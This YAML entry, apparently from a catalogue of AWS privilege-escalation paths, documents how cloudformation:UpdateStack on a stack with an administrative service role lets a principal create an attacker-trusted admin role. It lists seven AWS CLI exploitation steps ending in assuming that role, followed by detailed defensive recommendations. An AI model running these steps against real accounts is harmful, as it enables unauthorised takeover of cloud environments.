id: cloudformation-002
name: cloudformation:UpdateStack
category: existing-passrole
services:
- cloudformation
- iam
description: A principal with `cloudformation:UpdateStack` can modify an existing
  CloudFormation stack that has an administrative service role attached. CloudFormation
  stacks execute with the permissions of their service role, which often requires
  elevated privileges to manage infrastructure. By updating the stack template to
  include new IAM resources (such as an admin role with a trust policy allowing the
  attacker to assume it), the attacker can leverage the stack's elevated permissions
  to create resources they couldn't create directly. This is particularly insidious
  because it appears as legitimate infrastructure management activity.
prerequisites:
  admin:
  - A CloudFormation stack must exist with an administrative service role (e.g., AdministratorAccess
    or an equivalent custom policy)
  - The principal must have permission to update that specific stack
  lateral:
  - A CloudFormation stack must exist with a service role that has elevated permissions
  - The principal must have permission to update that specific stack
exploitationSteps:
  awscli:
  - step: 1
    command: "aws cloudformation describe-stacks \\\n  --stack-name TARGET_STACK_NAME\
      \ \\\n  --query 'Stacks[0].[StackName,StackStatus,RoleARN]'\n"
    description: Identify CloudFormation stacks with elevated service roles
  - step: 2
    command: "aws cloudformation get-template \\\n  --stack-name TARGET_STACK_NAME\
      \ \\\n  --query 'TemplateBody'\n"
    description: Retrieve the current stack template
  - step: 3
    command: '# Create modified template with added IAM role

      # Add resource like:

      # EscalatedAdminRole:

      #   Type: AWS::IAM::Role

      #   Properties:

      #     RoleName: escalated-admin-role

      #     AssumeRolePolicyDocument:

      #       Statement:

      #         - Effect: Allow

      #           Principal:

      #             AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USER

      #           Action: sts:AssumeRole

      #     ManagedPolicyArns:

      #       - arn:aws:iam::aws:policy/AdministratorAccess

      '
    description: Modify the template to add an IAM role with admin permissions and
      a trust policy allowing you to assume it
  - step: 4
    command: "aws cloudformation update-stack \\\n  --stack-name TARGET_STACK_NAME\
      \ \\\n  --template-body file://modified-template.json \\\n  --capabilities CAPABILITY_NAMED_IAM\n"
    description: Update the CloudFormation stack with the modified template (stack's
      service role creates the new admin role)
  - step: 5
    command: "aws cloudformation wait stack-update-complete \\\n  --stack-name TARGET_STACK_NAME\n"
    description: Wait for the stack update to complete
  - step: 6
    command: "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role\
      \ \\\n  --role-session-name escalation-session\n"
    description: Assume the newly created admin role
  - step: 7
    command: '# Configure AWS CLI with the temporary credentials from step 6

      # Now you have administrator access

      aws iam list-users

      '
    description: Verify administrator access
recommendation: "Restrict the `cloudformation:UpdateStack` permission using the principle\
  \ of least privilege.\n\nUse IAM policy conditions to restrict which stacks can\
  \ be updated:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"cloudformation:UpdateStack\"\
  ,\n  \"Resource\": \"arn:aws:cloudformation:*:*:stack/approved-stack-name/*\",\n\
  \  \"Condition\": {\n    \"StringEquals\": {\n      \"cloudformation:StackId\":\
  \ \"arn:aws:cloudformation:*:*:stack/approved-stack/*\"\n    }\n  }\n}\n```\n\n\
  Additional controls:\n- Implement least privilege principles for CloudFormation\
  \ service roles - avoid granting AdministratorAccess when more granular permissions\
  \ suffice\n- Use CloudFormation stack policies to prevent modifications to sensitive\
  \ resources:\n  ```json\n  {\n    \"Statement\": [\n      {\n        \"Effect\"\
  : \"Deny\",\n        \"Principal\": \"*\",\n        \"Action\": \"Update:*\",\n\
  \        \"Resource\": \"LogicalResourceId/SensitiveRole\"\n      }\n    ]\n  }\n\
  \  ```\n- Implement Service Control Policies (SCPs) to restrict CloudFormation stack\
  \ updates that create or modify IAM resources\n- Monitor CloudTrail for `UpdateStack`\
  \ API calls, especially those that modify stacks with elevated service roles\n-\
  \ Enable CloudFormation drift detection and alerts to identify unauthorized stack\
  \ modifications\n- Require MFA for CloudFormation updates using condition keys like\
  \ `aws:MultiFactorAuthPresent`\n- Use IAM Access Analyzer to identify and remediate\
  \ privilege escalation paths involving CloudFormation permissions\n- Implement change\
  \ approval workflows for CloudFormation stack updates that modify IAM resources\n\
  - Regularly audit CloudFormation service roles and reduce permissions to the minimum\
  \ required for stack operations\n"
limitations: 'This path provides administrative access only if the existing stack''s
  service role has administrative permissions. If the service role has limited permissions,
  the attacker gains access limited to those permissions. However, even limited access
  may enable multi-hop attacks.

  '
